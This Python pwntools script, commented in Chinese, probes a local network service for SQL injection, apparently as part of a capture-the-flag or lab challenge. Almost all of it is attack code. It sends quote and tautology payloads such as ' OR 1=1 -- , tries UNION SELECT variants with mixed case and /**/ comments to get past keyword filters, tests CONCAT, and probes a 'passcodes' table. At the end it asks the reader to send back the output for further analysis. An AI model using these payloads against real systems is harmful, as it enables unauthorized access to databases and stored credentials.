#!/usr/bin/env python3
from pwn import *
import time

# --- 配置 ---
HOST = '127.0.0.1'
PORT = 52594

def run_test(payload):
    """
    连接服务器，发送一个测试 payload，并返回响应。
    """
    response_text = f"[-] Payload: {payload}\n"
    try:
        p = remote(HOST, PORT, timeout=2, level='error')
        p.recvuntil(b': ', timeout=2)
        p.sendline(payload.encode())
        response = p.recvall(timeout=2)
        response_text += f"[+] Response (len={len(response)}): {response}\n"
        p.close()
    except Exception as e:
        response_text += f"[!] Error: {e}\n"
    
    print(response_text)
    time.sleep(0.5) # 短暂延时，避免过快连接被服务器拒绝

def main():
    log.info("--- 开始对服务器进行注入探测 ---")

    # 测试1: 发送一个正常的、肯定会失败的 passcode，建立“基准”响应
    log.info("1. 建立基准失败响应...")
    run_test("baseline_test_12345")

    # 测试2: 测试单引号是否有效，判断注入点类型
    log.info("2. 测试单引号注入...")
    run_test("'")

    # 测试3: 测试基本的 tautology (永真式)，看 OR 是否被过滤
    log.info("3. 测试 OR 逻辑...")
    run_test("' OR 1=1 -- ")

    # 测试4: 测试 UNION 和 SELECT 关键字 (使用不同的大小写和注释)
    log.info("4. 测试 UNION/SELECT 关键字...")
    run_test("' union select 1 -- ") # 全小写
    run_test("' uNiOn sElEcT 1 -- ") # 混合大小写
    run_test("' UNION/**/SELECT 1 -- ") # 使用 MySQL 注释绕过空格/关键字检测

    # 测试5: 测试不同的注释符
    log.info("5. 测试不同的注释符...")
    run_test("' OR 1=1#")

    # 测试6: 测试函数 CONCAT 是否被过滤
    log.info("6. 测试 CONCAT 函数...")
    run_test("' union select concat('a','b') -- ")

    # 测试7: 测试表名和列名是否有效
    log.info("7. 测试 'passcodes' 表...")
    run_test("' union select 1 from passcodes -- ")

    log.info("--- 探测结束 ---")
    print("请将上面的完整输出结果发给我，以便进一步分析。")


if __name__ == '__main__':
    main()